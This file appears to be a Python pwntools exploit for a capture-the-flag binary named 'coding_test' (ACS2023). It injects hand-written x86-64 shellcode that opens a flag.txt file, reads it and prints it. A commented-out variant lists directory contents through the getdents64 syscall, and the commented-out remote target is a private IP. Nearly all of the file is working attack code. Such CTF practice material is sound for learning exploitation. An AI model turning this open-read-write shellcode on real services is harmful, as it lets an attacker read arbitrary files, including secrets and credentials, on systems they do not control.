from pwn import *

# p = remote("192.168.0.45", 10137)
p = process("./coding_test")

context.log_level='debug'
context.arch='amd64'

# a = asm(shellcraft.openat(-2, '/home/hanz0x17/CTFArchive/ACS2023/coding_test').rstrip())
# a += asm('''
#             mov rdi,rax
#             xor rdx,rdx
#             xor rax,rax
#             mov dx,0x3210
#             lea rsi,[rsp]
#             mov al,217
#             syscall

            
#             mov rax, 1
#             mov rdi, 1
#             mov rsi, rsp
#             mov rdx, 500
#             syscall
#     ''')

a = asm(shellcraft.openat(-2, '/home/hanz0x17/CTFArchive/ACS2023/coding_test/flag.txt').rstrip())
a += asm('''            
            
            mov rdi, rax
            lea rsi, [rsp]
            mov rdx, 0x1000
            mov rax, 0
            syscall
            mov rdi, 1
            lea rsi, [rsp]
            mov rdx, rax
            mov rax,1
            syscall
    ''')

p.recvuntil(b": ")
p.sendline(a)
p.interactive()
